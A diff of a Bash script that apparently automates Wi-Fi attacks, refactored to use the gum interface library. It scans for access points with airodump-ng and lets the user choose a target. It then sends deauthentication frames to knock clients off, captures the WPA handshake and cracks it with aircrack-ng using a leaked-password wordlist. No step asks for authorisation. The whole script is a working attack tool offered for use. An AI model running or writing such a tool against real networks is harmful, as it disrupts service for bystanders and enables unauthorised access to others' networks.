@@ -10,42 +10,72 @@ NC='\033[0m' # No Color
 
 
 
-#
-#
 os=$(uname)
 homepath=$(echo ~)
 user=$(who | cut -d ' ' -f1 | sort | uniq)
 interface=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')
 
-banner () {
+function banner () {
     echo -e "                                  
-    @ github / ${BRIGHT_PURPLE}Layvth${NC} v 1.0
-   " 
+    Traffinetc v1.0
+    @github/${BRIGHT_PURPLE}Weekeyv${NC}" 
 }
-run_airodump() {
+
+
+function show_system_info() {
+    # System information
+    os=$(grep -E '^PRETTY_NAME=' /etc/os-release | cut -d= -f2 | tr -d '"')
+    kernel=$(uname -r)
+    uptime=$(uptime -p)
+    hostname=$(hostname)
+
+    interface=$(ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo$' | sed -n '2p')
+    gum style \
+        --margin "2 4" \
+    "System Status Panel" \
+    "" \
+    "Operating System   $os" \
+    "Kernel Version     $kernel" \
+    "Hostname           $hostname" \
+    "Uptime             $uptime" \
+    "Interface          $interface"
+}
+
+
+
+
+function run_airodump() {
     local interface=$1
-    echo -e "${GREEN}       [+] ${NC}Scanning for Wi-Fi networks on interface $interface..."
-    echo -e "${RED}       [ ATTENTION }${NC} ${YELLOW}MAKE SHOUR WHEN YOU PRESS Ctrl + C YOU ARE IN XTERM TERMINAL NOT THE MAIN ONE ${NC}"
-    echo -e "${YELLOW}       [+]${NC} When you Finish Scaning Press [Ctrl + c]"
-    xterm -geometry 100x50 -e "airodump-ng $interface --output-format csv -w outputfile"
-    filter_info outputfile-01.csv
-    exit 0
+    gum style --bold "    Scanning for Wi-Fi networks on interface: $interface"
+    gum style "    ATTENTION: Make sure when you press Ctrl + C you are in the xterm window, not your main terminal."
+    gum style "    When finished scanning, press Ctrl + C"
+    # Calculate position - adjust these if your screen or font size differs
+    rm -f outputfile*.csv
+    local screen_width=1920
+    local xterm_cols=100
+    local xterm_rows=50
+    local cell_width=8
+    local cell_height=16
+    local x_offset=$((screen_width - xterm_cols * cell_width))
+    local y_offset=0
+    xterm -geometry ${xterm_cols}x${xterm_rows}+${x_offset}+${y_offset} -e "airodump-ng $interface --output-format csv -w outputfile"
 }
 
-filter_info() {
-    rm final_result.txt 2>/dev/null
-    local input_file=$1
+
+function filter_info() {
+    rm -rf "final_result.txt"
+    local input_file="outputfile-01.csv"
     local output_file="ap_info.csv"
-    # Filtering important columns: BSSID, ESSID, Channel, Encryption
     awk -F ',' 'BEGIN {OFS=","} {if ($1 != "") print $1, $4, $14, $6, $7}' "$input_file" > "$output_file"
-    echo -e "${GREEN}       [+] ${NC}Filtered information saved in $output_file"
-    cat ap_info.csv | awk -F ',' '/,,,/{p++} p==1 && NF>1' | sed '1,2d; s/,,,,//g' | sort -u >> final_result.txt
-    rm ap_info.csv
-    rm outputfile-01.csv
-    choseTargetAp final_result.txt
+    gum style "    Filtered information saved in $output_file"
+    cat "$output_file" | awk -F ',' '/,,,/{p++} p==1 && NF>1' | sed '1,2d; s/,,,,//g' | sort -u >> final_result.txt
+    rm -rf "outputfile-01.csv"
+    rm -rf "ap_info.csv"
+
 }
 
-sendDeauth () {
+
+function sendDeauth () {
     local bssid=$1
     local interface=$2
     echo -e "${RED}"
@@ -54,93 +84,50 @@ sendDeauth () {
 
 }
 
-# Function to print table headers
-choseTargetAp() {
-    # Read input line by line from the file
-    local input_file=$1
 
-    # Parse the file using awk to handle variable lines and print in tabular format
-    awk -F ", " '
-        BEGIN {
-            # Define column widths
-            col1_width = 5   # Line number
-            col2_width = 18  # MAC Address
-            col3_width = 8   # Channel
-            col4_width = 20  # ESSID
-            col5_width = 12  # Security
-            col6_width = 12  # Encryption
-            
-            # Print top border with rounded corners
-            printf "      ╭───────┬────────────────────┬──────────┬──────────────────────┬──────────────┬──────────────╮\n"
-            # Print header
-            printf "      │ %-*s │ %-*s │ %-*s │ %-*s │ %-*s │ %-*s │\n", col1_width, "Line", col2_width, "MAC Address", col3_width, "Channel", col4_width, "ESSID", col5_width, "Security", col6_width, "Encryption"
-            # Print divider
-            printf "      ├───────┼────────────────────┼──────────┼──────────────────────┼──────────────┼──────────────┤\n"
-            line=0
-        }
+
+function choseTargetAp() {
+    local input_file="final_result.txt"
+
+    mapfile -t gum_choices < <(
+        awk -F ", *" '
         {
-            line++
-            # Print each field with proper formatting
-            printf "      │ %-*d │ %-*s │ %-*s │ %-*s │ %-*s │ %-*s │\n", col1_width, line, col2_width, $1, col3_width, $2, col4_width, $3, col5_width, $4, col6_width, $5
-        }
-        END {
-            # Print bottom border with rounded corners
-            printf "      ╰───────┴────────────────────┴──────────┴──────────────────────┴──────────────┴──────────────╯\n"
+            bssid = $1
+            ssid = ($3 == "" ? "No Name" : $3)
+            encryption = ($4 == "" ? "Unknown" : $4)
+            channel = ($2 == "" ? "?" : $2)
+            printf("%s %-20s %-10s %s\n", bssid, ssid, encryption, channel)
         }' "$input_file"
+    )
 
-    total_lines=$(wc -l < "$input_file")
+    echo
 
-    while true; do
-        if [ "$total_lines" -eq "0" ]; then
-            echo -e "${RED}[!] ${NC}No networks found. Try to run the script again."
-            break
-        elif [ "$total_lines" -eq "1" ]; then
-            startAttacking "1" "$input_file"
-            break
-        else
-            read -p "       #: Set target Network Number: " targetAp
-            if [ "$targetAp" -le "$total_lines" ] 2>/dev/null && [ "$targetAp" -gt "0" ]; then
-                startAttacking "$targetAp" "$input_file"
-                break
-            else
-                echo -e "       ${YELLOW}[?] ${NC}Please select a valid number from the table."
-            fi
-        fi
-    done
+    target_line=$(printf "%s\n" "${gum_choices[@]}" | gum choose --header="    Choose a target Wi-Fi network:")
+    selected=$(echo "$target_line" | cut -d '|' -f1 | xargs)
+    bssid=$(echo "$selected" | awk '{print $1}')
+    channel=$(echo "$selected" | awk '{print $4}')
+    gum style --bold "    Selected Target BSSID → $bssid"
+    gum style --bold "    Selected Target channel → $channel"
+    
+    startAttacking $bssid $channel
 }
 
-startAttacking () {
-    local lineNum=$1
-    local fileAps=$2
-    local filtered=$(sed -n "${lineNum}p" "$fileAps")
-    local targetAp=$(echo "$filtered" | awk '{print $3}' | sed 's/,//g')
-    local targetBSSID=$(echo "$filtered" | awk '{print $1}' | sed 's/,//g')
-    local targetChannel=$(echo "$filtered" | awk '{print $2}' | sed 's/,//g')
-    local interface=
-    echo -e "       - Your Target Network ${YELLOW}$targetAp${NC}"
-    read -p "       [ Press Enter to continue ]"
-    read -p "       [*] Do you Have Handshake File [y/n] : " hand_shake
-    if [ "$hand_shake" == "yes" ] || [ "$hand_shake" == "y" ]; then
-        echo -e "${YELLOW}      [!]${NC} if you don't have handshake file enter : ${YELLOW} ext ${NC}" 
-        while true; do
-            read -p "      [*] Path >: " handshake_file
-            if [ -f "$path" ]; then
-                break
-            else
-                echo -e "      File does not exist."
-            fi
-        done 
-    else
-        echo -e "${YELLOW}"
-        echo -e "       Start Get handshake File"
-        read -p "      [ Press Enter ]"
+function startAttacking() {
+    local targetBSSID=$1
+    local targetChannel=$2
+    gum confirm "    Start get handshake file" && hand_shake="yes" || hand_shake="no"
+    if [[ "$hand_shake" == "yes" ]]; then
+        aircrack_start "$handshake_file" "$targetBSSID"  
+        gum style --foreground 212 "      Starting handshake capture process..."
+        gum input --placeholder "    Press Enter to begin..." >/dev/null
         getHandshake "$targetBSSID" "$targetChannel"
-        echo -e "${NC}"
-
+    else
+        echo "have good day brosky ~"
     fi
 }
 
-getHandshake () {
+function getHandshake () {
+
     local bssid=$1
     local channel=$2
     local interfaceLocal=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')
@@ -150,10 +137,11 @@ getHandshake () {
     rm *
     sendDeauth "$bssid" "$interfaceLocal" &
     xterm -geometry 100x50 -e "airodump-ng -c $channel --bssid $bssid -w psk $interfaceLocal"
+
     aircrack_start $currentPath/handshake/psk-01.cap $bssid
 }
 
-aircrack_start() {
+function aircrack_start() {
     local capfile=$1
     local bssid=$2
     local path_wordlist="/home/dvsys/Desktop/seclist/Passwords/Leaked-Databases/all-shit.txt"
@@ -162,60 +150,19 @@ aircrack_start() {
 
 
 
-
-check_monitor_mode_support() {
-    # Check if the phy80211 directory exists for the interface
-    if [ -d "/sys/class/net/$interface/phy80211" ]; then
-        echo -e "${GREEN}       [*] ${NC}Interface ${YELLOW}($interface)${NC} supports monitor mode !"
-        mode=$(iwconfig $interface | grep "Mode:" | awk '{print $4}')
-        if [ "$mode" = "Mode:Monitor" ]; then
-            echo -e "       ${GREEN}[+] ${NC}You on ready in Monitro Mode !"
-            checkTools
-        else
-            read -p "       [*] Switch ($interface) to monitor mode (y/n) :   " input 
-            if [ "$input" == "yes" ] || [ "$input" == "y" ]; then
-                airmon-ng start $interface >> /dev/null
-                echo -e "${GREEN}       [*]~:${NC}$infterface Switched to monitor mode !"
-                checkTools
-            else 
-                echo -e "${RED}       [!]${NC} Sorry ! we can not run this script without Monitor mode !"
-            fi
-        fi
-        
+function check_monitor_mode_support() {
+    choice=$(echo -e "Yes\nNo" | gum choose --height=2 --header="Switch ($interface) to monitor mode?")
+    if [[ "$choice" == "Yes" ]]; then
+        echo -e "    $interface switched to monitor mode!"
+        airmon-ng start "$interface" >> /dev/null
     else
-        echo -e "${RED}     [!]${NC} Interface ($interface) does not support monitor mode"
-        echo -e "${RED}     [!]${NC} Error check your interface !${NC}"
-        echo ""
+        echo -e "Sorry, we cannot run this script without Monitor mode!"
         exit 1
     fi
 }
 
-ctrl_c () {
 
-    if iwconfig $interface 2>/dev/null | grep -q "Mode:Monitor" ; then
-        clear
-        banner
-        read -p "       [*] Do you want to exit from Monitor mode (yes/no) : " check
-        if [ "$check" == "yes" ] 2>/dev/null || [ "$check" == "y" ]; then
-            echo "       [*] Exiting from monitor Mode !"
-            exit 1
-        else
-            echo -e "${YELLOW}       [*] ${NC}Exit !"
-            exit 1
-        fi
-    else
-        #echo -e "${YELLOW}     [*]~: ${NC}Exit !"
-        clear
-        echo 
-        banner
-        echo "      GOOD BYE SIR  "
-        exit 1
-    fi
-}
-
-trap ctrl_c
-
-checkRoot () { 
+function checkRoot () { 
     if [ "$(id -u)" != "0" ]; then
         echo -e "${RED}[!]${NC} We need root permition !"
         echo -e "${YELLOW}[+]${NC} Try run with [ sudo su ] "
@@ -227,32 +174,47 @@ checkRoot () {
 } 
 
 
-checkTools() {
-    echo -e "${GREEN}       [+]${NC} Tools checking~:"
+function checkTools() {
+    gum style --bold "    Checking required tools..."
     tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "xterm")
     tools_found=0
+    missing_tools=()
     for tool in "${tools[@]}"; do
         sleep 0.2
-        tool_path=$(which "$tool")
-        if [ "$?" -ne "0" ]; then
-            echo -e "${RED}[ Not Found ] ${NC}$tool"
-            echo "${YELLOW}     [!] ${NC}try [ apt-get install $tool ] "
+        if ! command -v "$tool" &> /dev/null; then
+            gum style "    $tool    not found"
+            missing_tools+=("$tool")
         else
-            echo -e "       ${GREEN}[!]${NC} $tool ${GREEN}✅${NC}"
-            ((tools_found+=1)) # Increment the counter if the tool is found
+            gum style --foreground=212 "    found    $tool"
+            ((tools_found++))
         fi
     done
+    echo
     if [ "$tools_found" -eq "${#tools[@]}" ]; then
-        run_airodump $interface
+        gum style --bold "    All tools found. Proceeding..."
     else
-        echo -e "${RED}     [!] Some required tools were not found.${NC}"
+        gum style --bold "    Some tools are missing:"
+        for tool in "${missing_tools[@]}"; do
+            gum style "    Try installing with: sudo apt-get install $tool"
+        done
         exit 1
     fi
 }
 
-checkRoot
 
 
+function main () {
+    clear 
+    banner
+    show_system_info
+    check_monitor_mode_support
+    checkTools    
+    run_airodump "$interface"
+    filter_info
+    choseTargetAp
 
+}
+
+main 
 
 
